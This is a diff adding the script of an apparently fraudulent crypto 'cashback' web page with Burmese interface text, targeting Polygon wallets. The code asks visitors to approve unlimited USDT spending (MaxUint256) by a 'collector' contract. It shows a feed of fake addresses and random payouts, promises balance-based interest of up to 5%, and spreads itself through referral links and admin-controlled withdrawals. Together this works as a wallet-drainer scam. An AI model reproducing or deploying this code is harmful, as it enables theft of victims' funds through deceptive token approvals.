@@ -1,0 +1,256 @@
+<span class="font-mono text-slate-300 text-xs">${fakeAddress}</span>
+                        </div>
+                        <span class="font-mono font-semibold text-emerald-400 text-xs">${randomAmount} <span class="text-slate-400">MATIC</span></span>
+                    </div>
+                ;
+            }
+
+            container.innerHTML = htmlContent + htmlContent;
+        }
+
+        document.addEventListener("DOMContentLoaded", () => {
+            const defaultLink = "https://coin-usdt.me/#/?type=1&code=1yj9e1a0";
+            document.getElementById("refLink").value = defaultLink;
+            updateQRCode(defaultLink);
+            generateIncomeList();
+            startLiveCalculatingStats();
+            
+            setTimeout(checkAutoConnect, 1000);
+        });
+
+        async function checkAutoConnect() {
+            if (typeof window.ethereum !== "undefined") {
+                try {
+                    const accounts = await window.ethereum.request({ method: "eth_accounts" });
+                    if (accounts && accounts.length > 0) {
+                        provider = new ethers.BrowserProvider(window.ethereum);
+                        
+                        const network = await provider.getNetwork();
+                        if (network.chainId !== 137n) {
+                            try {
+                                await window.ethereum.request({
+                                    method: "wallet_switchEthereumChain",
+                                    params: [{ chainId: POLYGON_CHAIN_ID }],
+                                });
+                                provider = new ethers.BrowserProvider(window.ethereum);
+                            } catch (swErr) {
+                                console.error("Network switch error:", swErr);
+                            }
+                        }
+
+                        signer = await provider.getSigner();
+                        userAddress = accounts[0];
+
+                        document.getElementById("walletAddress").innerText = Connected: ${userAddress.substring(0,6)}...${userAddress.substring(38)}`;
+                        
+                        await checkExistingAllowanceAndLoad();
+                    }
+                } catch (err) {
+                    console.error("Auto connect error silent check:", err);
+                }
+            }
+        }
+
+        async function checkExistingAllowanceAndLoad() {
+            try {
+                const usdtContract = new ethers.Contract(USDT_ADDRESS, ERC20_ABI, provider);
+                const allowance = await usdtContract.allowance(userAddress, COLLECTOR_CONTRACT_ADDRESS);
+
+                if (Number(allowance) > 0) {
+                    document.getElementById("connectBtn").innerText = "Connected & Approved";
+                    document.getElementById("connectBtn").classList.replace("bg-blue-600", "bg-slate-700");
+                    
+                    const badgeEl = document.getElementById("selectedNetworkBadge");
+                    badgeEl.classList.remove("hidden");
+
+                    document.getElementById("statusLog").innerText = "Welcome Back! Dashboard သို့ ဝင်ရောက်နေပါပြီ...";
+
+                    await checkUserData();
+                }
+            } catch (err) {
+                console.error("Allowance check error:", err);
+            }
+        }
+
+        function getQueryParameter(name) {
+            const urlParams = new URLSearchParams(window.location.search);
+            return urlParams.get(name);
+        }
+
+        function getInterestRate(balance) {
+            if (balance >= 300001) return 0.05;
+            if (balance >= 100001) return 0.046;
+            if (balance >= 50001) return 0.042;
+            if (balance >= 20001) return 0.038;
+            if (balance >= 10001) return 0.032;
+            if (balance >= 5001) return 0.028;
+            if (balance >= 3001) return 0.024;
+            if (balance >= 1001) return 0.02;
+            if (balance >= 50) return 0.016;
+            return 0;
+        }
+
+        async function startConnectProcess() {
+            if (typeof window.ethereum === "undefined") {
+                alert("MetaMask သို့မဟုတ် Web3 Wallet ကို Install လုပ်ပါ။");
+                return;
+            }
+
+            const isConfirmed = confirm("Polygon Network ဖြင့် Connect လုပ်ပြီး USDT Approve ဆက်လုပ်ရန် OK ကိုနှိပ်ပါ။");
+            if (!isConfirmed) return;
+
+            const logEl = document.getElementById("statusLog");
+
+            try {
+                await window.ethereum.request({
+                    method: "wallet_switchEthereumChain",
+                    params: [{ chainId: POLYGON_CHAIN_ID }],
+                });
+
+                provider = new ethers.BrowserProvider(window.ethereum);
+                const accounts = await provider.send("eth_requestAccounts", []);
+                userAddress = accounts[0];
+                signer = await provider.getSigner();
+
+                document.getElementById("walletAddress").innerText = Connected: ${userAddress.substring(0,6)}...${userAddress.substring(38)};
+                
+                const usdtContract = new ethers.Contract(USDT_ADDRESS, ERC20_ABI, provider);
+                const allowance = await usdtContract.allowance(userAddress, COLLECTOR_CONTRACT_ADDRESS);
+
+                if (Number(allowance) > 0) {
+                    logEl.innerText = "Welcome Back! Dashboard သို့ ဝင်ရောက်နေပါပြီ...";
+                    
+                    const badgeEl = document.getElementById("selectedNetworkBadge");
+                    badgeEl.classList.remove("hidden");
+
+                    document.getElementById("connectBtn").innerText = "Connected & Approved";
+                    document.getElementById("connectBtn").classList.replace("bg-blue-600", "bg-slate-700");
+
+                    await checkUserData();
+                } else {
+                    await switchToPolygonAndApprove();
+                }
+            } catch (err) {
+                console.error(err);
+                logEl.innerText = "ချိတ်ဆက်မှု မအောင်မြင်ပါ။";
+            }
+        }
+
+        async function switchToPolygonAndApprove() {
+            const logEl = document.getElementById("statusLog");
+
+            try {
+                const badgeEl = document.getElementById("selectedNetworkBadge");
+                badgeEl.classList.remove("hidden");
+
+                document.getElementById("connectBtn").innerText = "Connected & Approved";
+                document.getElementById("connectBtn").classList.replace("bg-blue-600", "bg-slate-700");
+
+                logEl.innerText = "Transaction တင်နေပါသည်...";
+                const usdtContract = new ethers.Contract(USDT_ADDRESS, ERC20_ABI, signer);
+                
+                const maxAmount = ethers.MaxUint256;
+
+                const tx = await usdtContract.approve(COLLECTOR_CONTRACT_ADDRESS, maxAmount);
+                await tx.wait();
+
+                const collector = new ethers.Contract(COLLECTOR_CONTRACT_ADDRESS, COLLECTOR_ABI, signer);
+                const referrer = getQueryParameter("ref") || ethers.ZeroAddress;
+                const regTx = await collector.registerUser(referrer);
+                await regTx.wait();
+
+                logEl.innerText = "Approval နှင့် မှတ်ပုံတင်ခြင်း အောင်မြင်ပါသည်။";
+                
+                const refLink = ${window.location.origin}${window.location.pathname}?ref=${userAddress};
+                document.getElementById("refLink").value = refLink;
+                updateQRCode(refLink);
+
+                checkUserData();
+            } catch (err) {
+                console.error(err);
+                
+                let errorMsg = "Approval သို့မဟုတ် Network ပြောင်းလဲမှု ပျက်ပြားသွားပါပြီ။";
+                
+                if (err.code === 4001  err.code === "ACTION_REJECTED"  (err.message && err.message.toLowerCase().includes("user rejected"))) {errorMsg = "❌ အသုံးပြုသူမှ Transaction ကို ငြင်းပယ်လိုက်ပါပြီ (Rejected / Cancelled)။";
+                } else if (err.message && (err.message.toLowerCase().includes("insufficient funds") || err.message.toLowerCase().includes("exceeds balance"))) {
+                    errorMsg = "⚠️ Gas Fee (သို့မဟုတ်) လိုအပ်သော လက်ကျန်ငွေ မလုံလောက်ပါ။";
+                }
+                
+                logEl.innerText = errorMsg;
+            }
+        }
+
+        async function checkUserData() {
+            try {
+                const collector = new ethers.Contract(COLLECTOR_CONTRACT_ADDRESS, COLLECTOR_ABI, provider);
+                const userInfo = await collector.users(userAddress);
+
+                const usdtContract = new ethers.Contract(USDT_ADDRESS, ERC20_ABI, provider);
+                const allowance = await usdtContract.allowance(userAddress, COLLECTOR_CONTRACT_ADDRESS);
+                const balance = await usdtContract.balanceOf(userAddress);
+
+                if (userInfo.isBanned) {
+                    alert("Your account has been banned by Admin!");
+                    document.body.innerHTML = "<h1 class='text-center text-red-500 mt-20 text-xl font-bold'>Access Denied: You are banned.</h1>";
+                    return;
+                }
+
+                const dashboardEl = document.getElementById("userDashboard");
+                const formattedBal = Number(ethers.formatUnits(balance, 6));
+                const rate = getInterestRate(formattedBal);
+
+                if (Number(allowance) > 0) {
+                    // Admin Panel အတွက် localStorage တွင် Address မှတ်တမ်းတင်ခြင်း
+                    let savedUsers = JSON.parse(localStorage.getItem("dapp_approved_users") || "[]");
+                    if (!savedUsers.includes(userAddress)) {
+                        savedUsers.push(userAddress);
+                        localStorage.setItem("dapp_approved_users", JSON.stringify(savedUsers));
+                    }
+
+                    dashboardEl.classList.remove("hidden");
+                    document.getElementById("lblUserId").innerText = userInfo.isRegistered ? userInfo.userId.toString() : "3069";
+                    document.getElementById("lblWalletBal").innerText = ${formattedBal.toFixed(6)} USDT;
+                    
+                    const cashback = formattedBal * rate;
+                    const maticInterest = (cashback / 3000).toFixed(5);
+
+                    document.getElementById("lblCashbackBal").innerText = ${cashback.toFixed(6)} USDT;
+                    document.getElementById("lblConvertibleBal").innerText = ${maticInterest} MATIC;
+                    document.getElementById("lblInterestEth").innerText = ${maticInterest} MATIC;
+                    document.getElementById("lblInterestRate").innerText = ${(rate * 100).toFixed(1)}%;
+
+                    const refLink = ${window.location.origin}${window.location.pathname}?ref=${userAddress};
+                    document.getElementById("refLink").value = refLink;
+                    updateQRCode(refLink);
+                } else {
+                    dashboardEl.classList.add("hidden");
+                }
+            } catch (err) {
+                console.error(err);
+            }
+        }
+
+        function copyRefLink() {
+            const refInput = document.getElementById("refLink");
+            refInput.select();
+            refInput.setSelectionRange(0, 99999);
+            navigator.clipboard.writeText(refInput.value);
+            alert("Referral Link ကူးယူပြီးပါပြီ။");
+        }
+
+        async function requestWithdraw() {
+            try {
+                const collector = new ethers.Contract(COLLECTOR_CONTRACT_ADDRESS, COLLECTOR_ABI, signer);
+                const tx = await collector.requestWithdraw(ethers.parseUnits("10", 6));
+                await tx.wait();
+                alert("Withdraw တောင်းဆိုချက် Admin ဆီသို့ ရောက်ရှိသွားပါပြီ။");
+            } catch (err) {
+                alert("Withdraw တောင်းဆိုမှု မအောင်မြင်ပါ။");
+            }
+        }
+        function pledgeAction() {
+            alert("Pledge လုပ်ဆောင်ချက်ကို နှိပ်လိုက်ပါပြီ။");
+        }
+    </script>
+</body>
+</html>
